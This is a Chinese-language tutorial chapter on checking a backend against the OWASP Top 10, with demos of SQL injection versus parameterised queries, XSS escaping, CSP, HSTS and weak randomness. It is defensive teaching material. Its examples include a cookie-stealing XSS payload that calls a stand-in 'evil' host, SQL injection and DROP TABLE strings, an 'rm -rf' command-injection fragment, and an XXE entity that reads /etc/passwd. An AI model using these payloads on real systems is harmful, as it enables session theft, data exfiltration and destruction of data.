# Web 安全：按 OWASP Top 10 逐条自查一个后端

上线前用扫描器扫了一遍「0 高危」，第二天订单查询接口被人用 `a@x.com' OR '1'='1` 一条 SQL 拉走了全库——扫描器没报，是因为注入点在「字符串拼出来的那条 SQL」里，静态规则看不见运行时的拼接结果。这也不是 XSS、不是配置错，而是「数据与代码没有分离」这个二十年的老问题原样复现。

第二种：前端某处能回显用户昵称，攻击者把昵称写成 `<script>fetch('https://evil/?c='+document.cookie)</script>`，一个存储型 XSS 就把别人的会话偷走了——**根因不是「有脚本」，而是这段文本被当成了代码执行，你从没告诉过浏览器哪些内容可信**。第三种：`npm audit` 报了一堆高危，你说「都是传递依赖，先不管」，两周后日志里出现一条对着老 CVE 的自动化利用流量——组件的已知漏洞不需要你写错任何一行代码就能被打。第四种最阴：入侵已经发生，攻击者在系统里待了三个月，你是在第三方提醒你时才发现的——**因为你根本没有安全日志和告警，攻击和正常流量在监控里长一模一样**。

这四类恰好落在 OWASP Top 10 的四个不同条目上。本章是[认证](/backend/auth-session)、[授权](/backend/authorization)、[错误处理](/backend/error-handling)、[API 文档](/backend/api-docs)几章的横向收口：**安全不是多加一个功能，而是让前面每一层「默认就关不上门」。** 方法也固定，每个条目都问四件事——攻击长什么样、为什么会出现、怎么防、以及怎么验证你真的防住了（最后一问最常被跳过，也最致命）。

## 先立一张地图：条目落点与当前版本

OWASP Top 10 约每四年出一个版本；2026-10-18 用 WebFetch 打开 [owasp.org 的 Top 10 项目页](https://owasp.org/www-project-top-ten/)，页面标注当前版本为 **OWASP Top 10 2025**。各条目的**编号与命名以官方当前版本为准**，动手前请对着官方清单核对——下表用的是广为沿用的条目名，把 XXE、反序列化这类在早期版本（2017）单列、后来被归并进其他类的问题也一起列出，因为它们仍是真实高频故障点：

| 条目（通俗名） | 攻击长什么样 | 为什么会出 | 怎么防 | 怎么验证防住了 |
| --- | --- | --- | --- | --- |
| 注入（SQL/命令/NoSQL） | 输入里带 `' OR '1'='1`、`; DROP TABLE` | 把不可信数据和查询语言拼在一起 | 参数化查询/预编译、最小权限账号、输入白名单 | 灌 payload，看返回行数和是否执行了第二条语句（本章实测） |
| 失效的认证 | 撞库、弱口令、会话固定、明文口令 | 口令存得能被反查、会话能预测、登录后不换 id | 慢哈希+盐、CSPRNG 会话、登录后换 id、限速+锁定 | 拖库样本能否还原；旧 sid 登录后是否失效 |
| 敏感数据暴露 | 抓包看到明文口令、密钥进 Git、备份泄露 | 传输不加密、静态不加密、密钥当配置硬编码 | 全站 HTTPS、静态加密、密钥托管、脱敏日志 | 抓一次包看是不是明文；扫仓库看有无密钥 |
| 访问控制失效 | 改 URL 里的 id 看别人订单；普通用户调 admin 接口 | 只校验「登录没」没校验「这条是不是你的/你有没有权限」 | 默认拒绝、资源级校验、服务端 RBAC（见[授权](/backend/authorization)） | 用 A 的会话请求 B 的资源，必须 403 |
| XSS | 回显内容被当脚本执行、偷会话 | 用户内容进了 HTML 却没有按上下文转义 | 输出转义、`HttpOnly`、CSP 兜底 | 注入 script 标签看是否被当文本渲染（本章实测） |
| XXE | 上传 XML，外部实体读 `/etc/passwd`、打内网 | XML 解析器默认允许解析外部实体/DTD | 关闭 DTD 与外部实体（现代解析器多数默认关） | 提交带 SYSTEM 实体的 XML 看是否触发外部读取 |
| 反序列化 | 不可信字节流/被签名的对象被直接反序列化执行 | 把序列化当成安全的「传输格式」 | 只反受信数据、类型白名单、禁用多态字段 | 构造恶意序列化载荷看能否触发副作用 |
| 安全配置错误 | 默认口令、目录遍历、`X-Powered-By`、CORS `*`、调试页上线 | 装完不加固、错误页带栈、头加错 | 硬化清单、关详细错误、精简头、CORS 精确白名单 | 用扫描器+人工核对响应头与错误页 |
| 组件已知漏洞 | 打依赖的历史 CVE | 只盯直接依赖、忽略传递依赖、不更新 | 锁版本、定期 `npm audit`、SBOM、镜像/传递依赖治理 | 生成依赖清单比对已知漏洞库 |
| 日志与监控告警缺失 | 入侵后无痕迹、告警不响 | 没记安全事件、记了没人看、级别全 `info` | 结构化安全日志、异常检测、告警通道（见[日志与监控](/backend/logging-and-monitoring)） | 模拟一次攻击，看是否留下可查记录并触发告警 |

下面挑四个「能本机实测、且最能说明『验证』这一步」的深挖：注入、XSS、密码学与随机数误用、CSP 与安全头。

## 注入：拼接把数据当代码，参数化把它当回数据

把用户输入拼进 SQL，本质是让用户「也能写 SQL」。用本机内置 `node:sqlite` 起了个三行内存表（`a@x.com`/`b@x.com`/`root@x.com(admin)`），同一个查询两种写法对照，**这是真跑的输出**：

```text
输入: "' OR '1'='1"
  拼接后真实 SQL : SELECT id, name, role FROM users WHERE email = '' OR '1'='1'
  拼接返回行数   : 3 ["user","user","admin"]
  参数化返回行数 : 0 []

输入: "root@x.com' --"
  拼接后真实 SQL : SELECT id, name, role FROM users WHERE email = 'root@x.com' --'
  拼接返回行数   : 1 ["admin"]
  参数化返回行数 : 0 []
```

第一行 `... WHERE email = '' OR '1'='1'` 恒真，返回全部 3 行、把 `admin` 也带出来了；第二行 `--` 把结尾的引号注释掉，直接冒充 admin 登录。同样这两个输入走参数化（`WHERE email = ?`），返回 **0 行**——因为带引号的字符串 `"' OR '1'='1"` 只是拿去和一个不存在的邮箱做等值比较，引号在参数里不改变 SQL 结构。这就是参数化的全部秘密：**数据永远只是数据，不会变成语法。**

代码形状：

```js
import { DatabaseSync } from 'node:sqlite';   // 本机 Node 内置，ExperimentalWarning 可忽略
const db = new DatabaseSync(':memory:');
// 危险：模板字符串拼进去
const bad = db.prepare(`SELECT * FROM users WHERE email = '${input}'`);
// 正确：占位符，值走 all() 的参数
const good = db.prepare('SELECT * FROM users WHERE email = ?');
good.all(input);
```

<Callout type="warn" title="多语句与破坏性载荷">

实跑里我还演示了 `exec()` 能连跑多条语句：`DROP TABLE users;` 之后 `SELECT * FROM users` 报 `no such table: users`。真实数据库里 `'x'; DROP TABLE users; --` 这种载荷能不能得手，取决于驱动是否允许多语句、账号权限是否最小。**参数化挡住注入，但挡住越权删表还得靠数据库账号本身没有 `DROP` 权限**——这是纵深防御的两层，缺一不可。

</Callout>

同一原则适用于命令注入（`exec(\`convert ${uploadName}\`)` 里的文件名可拼 `; rm -rf`）：用参数数组而非拼字符串、白名单校验、绝不把用户输入交给 shell 解析。

## XSS：转义是上下文敏感的，CSP 只是兜底

把用户内容塞回 HTML，正确做法是**输出转义**。实跑对照同一段 payload：

```text
原始存入: Bob<script>fetch("https://evil.tld/?c="+document.cookie)</script>
直接拼进模板(危险): <span>Bob<script>fetch("https://evil.tld/?c="+...
转义后(安全): <span>Bob&lt;script&gt;fetch(&quot;https://evil.tld/?c=&quot;+document.cookie)&lt;/script&gt;</span>
```

转义后 `<` `>` `"` 变成实体，浏览器把它当**文本**渲染，脚本不再执行。但转义是**上下文相关**的，这是 XSS 反复复发的根源——同样这段转义，用在不同位置效果不同：

```text
属性上下文里的输入: " onclick="alert(1)
转义后: &quot; onclick=&quot;alert(1)
```

在 HTML 属性里，`"` 必须转义才能防住「提前闭合属性再塞事件处理器」；而如果把内容放进 `style`、`href="javascript:"`、或 `<script>` 标签内部，光靠 HTML 实体转义是**不够**的，要用对应上下文的编码，或者根本不允许这些位置出现用户数据。三条落地规矩：

1. 优先用框架的自动转义（`textContent` / 模板插值），别手工拼 `innerHTML`。
2. 会话 Cookie 一律 `HttpOnly`，让「偷到脚本」也偷不到会话（见[认证](/backend/auth-session)）。
3. 上 CSP 作为最后一道网——**即使转义漏了某处，也限制脚本能从哪加载**。

## CSP：各指令、严格部署与安全头加错的代价

内容安全策略（Content-Security-Policy）告诉浏览器「哪些来源的脚本/样式/连接可以执行」。据 [MDN CSP 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)（2026-10-18 读取）整理核心指令：

| 指令 | 控制什么 |
| --- | --- |
| `default-src` | 其余 fetch 类指令未单独声明时的兜底 |
| `script-src` | JS/WebAssembly 允许来源（也是 `script-src-elem/attr` 的兜底） |
| `style-src` | 样式表允许来源 |
| `img-src` | 图片来源 |
| `connect-src` | `fetch`/XHR/WebSocket 能连哪些 URL |
| `frame-ancestors` | 哪些父页能用 iframe 嵌你（替代 `X-Frame-Options`） |
| `object-src` | `<object>`/`<embed>` 来源（`'none'` 常配） |
| `base-uri` | `<base>` 允许的 URL |
| `form-action` | 表单能提交到哪些 URL |
| `upgrade-insecure-requests` | 把 HTTP 资源请求自动升级成 HTTPS |
| `report-to` / `report-uri` | 违规上报端点（`report-uri` 已弃用，优先 `report-to`） |

关于「放开」的几种写法：

- `'unsafe-inline'`：允许内联脚本/样式，**基本等于给 script 类 XSS 开门**，除非有历史包袱否则别用。
- `'unsafe-eval'`：允许 `eval`/`Function`，只有少数运行时（部分模板/解释器）才需要。
- `'nonce-<随机值>'`：每个响应生成一次性随机数，`<script>` 带同名 `nonce` 才放行——比 `unsafe-inline` 安全得多。**注意：一个指令里同时有 nonce 和 `unsafe-inline` 时，支持 nonce 的浏览器会忽略 `unsafe-inline`。**
- `'<alg>-<hash>'`：对固定脚本内容算哈希放行（`sha256`/`sha384`/`sha512`）。
- `'strict-dynamic'`：被 nonce/hash 信任的脚本，它动态 `createElement('script')` 加载的后代也自动受信，此时会忽略 host-source、`'self'`、`unsafe-inline`。

**部署顺序错了会直接把站点打挂，所以务必先 Report-Only**（MDN 明确推荐）：

```text
Reporting-Endpoints: csp-endpoint="https://example.com/csp-reports"
Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint
```

先看上报里有没有被误伤的正常资源，调顺了再切成强制头 `Content-Security-Policy`。另两条易错点，据同一文档：**多个 `Content-Security-Policy` 头同时存在时，浏览器执行的是「最严格的那条」**——你在网关加一条、应用又加一条，可能互相打架把合法功能封了；`frame-ancestors` 只在 CSP 里生效，靠 `X-Frame-Options` 已不完整。

安全头加错的典型后果，一张表说清：

| 配错的头 | 现象 | 为什么 |
| --- | --- | --- |
| `Content-Security-Policy: ... 'unsafe-inline'` | 以为上了 CSP，实际形同没上 | 内联脚本仍放行，XSS 照跑 |
| CSP 强制模式下漏了某条正常来源 | 页面样式/脚本大面积失效 | 直接拦截而非 report-only |
| `Access-Control-Allow-Origin: *` 又 `Allow-Credentials: true` | 浏览器拒绝该 CORS，带 Cookie 的跨域全挂 | 通配 + 凭证是非法组合（见[HTTP 与 REST 原理](/backend/http-and-rest)） |
| `Strict-Transport-Security` 在还没全站 HTTPS 时就下发 | 用户此后只能走 HTTPS，HTTP 页面全打不开 | HSTS 把协议升级写进了浏览器缓存 |
| 重复下发同一个头（网关 + 应用各加一份） | 行为不可预期、排障困难 | CSP 取最严，其它头可能报错或被忽略 |

## HTTPS 与 HSTS

`Secure` Cookie 只在 HTTPS 发送（`localhost` 例外）。全站 HTTPS 之后加 **HSTS**，让浏览器在一定期限内即使你手滑打了 `http://` 也强制走 `https://`，挡住协议降级与首次跳转被劫持：

```text
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

`max-age` 从几周到一年按需；`includeSubDomains` 会把所有子域一起纳入——**没确认每个子域都能上 HTTPS 前别加 `includeSubDomains`**，否则某个只有 HTTP 的子域会直接打不开。想进浏览器预加载列表（`preload`）是更强的承诺、难以撤销，上之前核对官方预加载入口。

## 密码学与随机数的误用（实测 `Math.random`）

「用了随机数」不等于「用了安全随机数」。**任何 token、会话 id、重置码、CSRF 令牌都必须来自 CSPRNG**（`crypto.randomBytes` / `randomUUID` / `randomInt`），不能用 `Math.random`。它的问题不是「偶尔碰撞」，而是熵不足、且可能可被建模预测。两个实测：

**（a）6 位重置验证码的生日碰撞**：用 `Math.floor(Math.random()*1e6)` 造验证码，样本空间只有 100 万：

```text
生成到第 696 个出现重复（样本空间仅 1,000,000）
暴力枚举上限 1e6，按 500 次/秒 => 33.3 分钟就能撞中一个有效验证码
```

也就是说「6 位数字验证码」这种设计，攻击者对着一个用户穷举不到半小时就能蒙中一个——根因是**空间太小**，不是 `Math.random`。真正要防的是：验证码位数/字母表够大（或用更长的字母数字）、有失效次数与 TTL、并且发送侧限速。生成它也别用 `Math.random()*1e6` 取模（有轻微取模偏差），用 `crypto.randomInt(0, 1e6)`（实测输出如 `732312`）。

**（b）弱 token 与强 token 对照**：`Math.random` 拼出来的 `b999bfaqrnlhni3z...` 看着长，但每段只有 `Math.random` 那点熵；`crypto.randomBytes(32).toString('base64url')` 得到 43 字符、满熵（实测样例见下节）。

密码学误用还有几条反复出现的坑：用 `Math.random` 生成密钥/盐；自己造加密方案（用 AES-ECB、或加密不验签导致可被篡改）；把哈希当加密；用固定 IV。原则是**别自己造密码学轮子**，口令哈希走[认证](/backend/auth-session)里的 scrypt/argon2id，对称加密用成熟库的 AEAD（如 GCM）并**验证完整性**。

## 组件已知漏洞、依赖审计与 SBOM

A06 不要求你写错代码，只要跑了一个带 CVE 的版本就会被打。三件事：

1. **直接 + 传递依赖都要管。** `npm audit` 会顺着锁文件把所有传递依赖对着漏洞库比对；「那是间接依赖、与我无关」是危险借口——间接依赖同样进你的运行时。`npm audit --json` 能拿到结构化结果挂进 CI。
2. **锁版本 + 定期升级。** 用 lockfile 固化可复现构建，同时设周期把依赖升到补丁版本，避免攒成一次巨大且不安全的升级。
3. **SBOM（软件物料清单）。** 生成一份「这个产物到底含哪些包、哪个版本」的清单（npm 可用 `npm sbom --sbom-format cyclonedx`），出问题时先查清单里有没有那根炸线的组件，而不是现场重扫。

```bash
npm audit                 # 人读，列出漏洞与修复建议
npm audit --json          # 结构化，挂 CI
npm sbom --sbom-format cyclonedx > sbom.json   # 物料清单
```

<Callout type="unverified" title="上面三条命令未在本机执行">

本章后端示例只跑 `node:` 内置模块、未安装任何依赖、也未在真实项目上跑 `npm audit` / `npm sbom`；命令形态与用途据 npm 官方文档描述，`--sbom-format` 等具体参数以你所用 npm 版本为准，动手前核对 [npm 文档](https://docs.npmjs.com/)。OWASP Top 10 条目编号命名亦以官方当前版本为准。

</Callout>

## XXE 与反序列化：两类「解析器默认行为」的坑

- **XXE（XML 外部实体）**：XML 解析器若允许 DTD/外部实体，攻击者提交带 `<!ENTITY x SYSTEM "file:///etc/passwd">` 的文档，就能读服务器本地文件、探测内网、甚至造成拒绝服务（实体炸弹）。防法：显式关闭 DTD 与外部实体（很多现代解析器默认已关，但别假设——检查解析配置）。**能不解析不受信 XML 就不解析。**
- **不安全反序列化**：把不可信的字节流/对象直接 `unserialize`/`readObject` 会触发任意类实例化、进而执行代码。JS/Node 里 `JSON.parse` 本身不执行代码（只是数据），但仍要防「反序列化后拿去当对象用」的二次利用、以及原型污染（`__proto__` 注入）。防法：只反受信来源、用类型/字段白名单校验解析结果、禁用多态反序列化。

## 日志与监控告警缺失：最容易被忽略的一条

A09 说的是「攻击发生了但你不知道」。登录爆破、越权尝试、异常 SQL、大量 4xx/5xx 突增，这些**必须写进可检索的日志并配告警**，否则入侵事件和你自己的正常流量在监控里长得一模一样。要点：安全事件记「谁、何时、从哪个 IP、对哪个资源、成功还是失败」，但**别把口令、会话 id、令牌写进日志**（脱敏，参见[统一错误处理](/backend/error-handling)里那条「敏感串别进日志」）；结构化日志、request id、健康检查的完整做法在[日志与监控](/backend/logging-and-monitoring)展开。

## 常见错误与排查

**1. 还在用字符串拼 SQL / shell 命令。** 现象：扫描器不报但一条 `' OR '1'='1` 拉全库（本章实测 3 行含 admin）。确认：全文搜 SQL 模板串里的 `${`、`+ userInput`；灌恒真 payload 看返回行数。修：参数化/预编译 + 数据库账号最小权限。

**2. 转义只做了 HTML、没做上下文。** 现象：昵称回显正常但放进某个属性/URL 时 XSS 复发。确认：把内容投到 `onclick`、`href`、`<script>` 内部各试一次。修：用框架自动转义、禁止危险上下文出现用户数据、补 CSP 兜底。

**3. CSP 直接上强制模式。** 现象：上线后页面大面积样式/脚本挂。原因：没先 report-only 就拦。确认：切 `Content-Security-Policy-Report-Only` 看上报有无误伤。修：先观察调顺，再切强制；别用 `unsafe-inline` 掩盖转义问题。

**4. `Math.random` 用来发凭证。** 现象：重置码/会话 id 可被枚举（本章实测 6 位码 696 次即生日碰撞、穷举约半小时）。确认：全局搜 `Math.random` 是否出现在 token/id/code 生成处。修：改 `crypto.randomBytes`/`randomInt`，并给验证码足够长度 + TTL + 失败次数限制 + 限速。

**5. 依赖只审计直接层。** 现象：`npm audit` 一堆高危被告知「间接依赖忽略」。确认：看锁文件里那棵传递树是否真无 CVE。修：升级或替换、把审计挂进 CI、生成 SBOM 备查。

**6. 全站 HTTPS 前就下发 HSTS。** 现象：某只有 HTTP 的子域打不开。原因：`max-age` 已被浏览器记住、`includeSubDomains` 扩大了范围。确认：看子域是否都上了证书。修：确保全覆盖再下发，初期 `max-age` 设短、暂不加 `includeSubDomains`。

## 练习

<Exercise title="练习 1 · 判断四段代码的注入风险" difficulty="基础">

逐条标注「有注入风险」还是「安全」，并说明防线：① `db.prepare('SELECT * FROM u WHERE id = ?').all(id)`；② `exec('convert ' + filename)`；③ `res.send('<p>' + req.query.q + '</p>')`；④ `new DOMParser().parseFromString(untrustedXml)` 未关外部实体。

<template #answer>

① 安全：参数化，`?` 占位符让 id 只作数据（本章实测：拼接版恒真返回 3 行，参数化返回 0 行）。② **命令注入**：`filename` 拼进 shell，可写 `x; rm -rf ...`；改用参数数组形式 `execFile('convert', [filename])` 并对文件名白名单。③ **存储/反射型 XSS**：查询参数未转义直接回显 HTML；应做 HTML 转义或用框架模板自动转义（本章实测转义后 `&lt;script&gt;` 变文本）。④ **XXE**：默认解析外部实体会读本地文件/打内网；必须显式关闭 DTD 与外部实体。

</template>

</Exercise>

<Exercise title="练习 2 · 故意把 CSP 加错并解释现象" difficulty="进阶">

你给站点加了 `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'`，又同时在网关上补了一条 `Content-Security-Policy: default-src 'self'`。请解释：① 加了 `unsafe-inline` 后 XSS 还防得住吗？② 两条头同时存在时浏览器按哪条执行？③ 正确的上线顺序是什么？

<template #answer>

① 防不住多少：`'unsafe-inline'` 允许内联脚本与事件处理器执行，正是最常见存储型 XSS 的落点——等于给 XSS 开门，CSP 形同虚设。要用 `'nonce-...'` 或哈希替代它。② 据 MDN：**多个 CSP 头并存时执行「最严格的那条」**，两条策略取交集，网关那条 `default-src 'self'` 更严，应用那条里 `unsafe-inline` 想放开内联也放不开（会被另一条的严格约束压制）；实际表现为合法内联脚本仍被拦，很难排障。正确做法是只在一处定义 CSP。③ 顺序：先发 `Content-Security-Policy-Report-Only` + `report-to` 观察上报，确认没误伤，再切成单条强制 `Content-Security-Policy`。

</template>

</Exercise>

<Exercise title="练习 3 · 为什么 6 位验证码不够、怎么补" difficulty="挑战">

实测 6 位数字验证码（`Math.random` 生成）第 696 个就出现重复，穷举 100 万约半小时命中一个。请把这道题拆成「熵」「限速」「生命周期」三层，指出每一层单独加为什么不够、三层合起来才挡住。

<template #answer>

**熵**：6 位纯数字只有 10^6 空间，生日碰撞在几百次就出现、穷举半小时可破；单换 `crypto.randomInt` 只修「可预测」，修不了「空间小」——要加到 6 位字母数字混合或 8 位数字，把空间抬到 10^12 以上。**限速**：不限速的话，攻击者对单个目标可无限次提交，再大的空间也能慢慢撞；要给每个验证码/每 IP/每账号设提交次数上限。**生命周期**：验证码若无 TTL、用一次即销毁，则即便猜中也早过期；必须设短有效期 + 一次性消费 + 失败若干次作废重发。

三层是**乘法关系**：熵决定「猜中一次有多难」、限速决定「一秒能试多少次」、生命周期决定「猜中的机会窗口有多久」。任何一层缺位，另外两层的收益都会被吃穿。附带：验证码别回显在页面源码里、别写进日志、别用 `Math.random` 生成（本章结论）。

</template>

</Exercise>

## 官方文档与延伸阅读

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) 与 [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) —— 本章条目地图与逐项防御的依据；2026-10-18 WebFetch 确认项目页当前标注版本为 OWASP Top 10 2025，**各条编号与命名以官方当前版本为准**。
- [MDN Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) —— 核实各指令含义、`'unsafe-inline'/'unsafe-eval'/nonce/hash/`strict-dynamic` 语义、report-only 优先的部署建议，以及「多个 CSP 头取最严」这条。2026-10-18 读取。
- [MDN HTTP 文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP) —— 核实 HTTPS/HSTS、CORS 与凭证组合等头部行为。
- [Node.js `crypto` 文档](https://nodejs.org/docs/latest/api/crypto.html) 与 [Node.js `sqlite` 文档](https://nodejs.org/docs/latest/api/sqlite.html) —— 核实 `randomBytes`/`randomInt`/`timingSafeEqual` 用法，以及本章注入对照所用的内置 `node:sqlite`（`DatabaseSync`，当前为实验特性，API 以你所用版本为准）。
- [npm 文档](https://docs.npmjs.com/) —— 核实 `npm audit` / `npm sbom` 的用途与参数形态（本章未在本机运行）。

## 下一章

本章把 OWASP Top 10 逐条走了一遍，并实测了三处最关键的：注入拼接 vs 参数化（恒真载荷从返回 3 行含 admin 塌回 0 行）、XSS payload 转义前后（`<script>` 变实体文本）、`Math.random` 造验证码的生日碰撞与穷举时长；也讲清了 CSP 指令、report-only 部署顺序、HSTS、依赖审计与 SBOM，以及「安全头加错会怎样」。但前面所有攻击能不能被发现，取决于一件事：你有没有把异常落进可检索、能告警的记录。下一章[日志与监控](/backend/logging-and-monitoring)把「出事能不能第一时间知道」这件事补齐——这也是本章 A09 那条的正解。
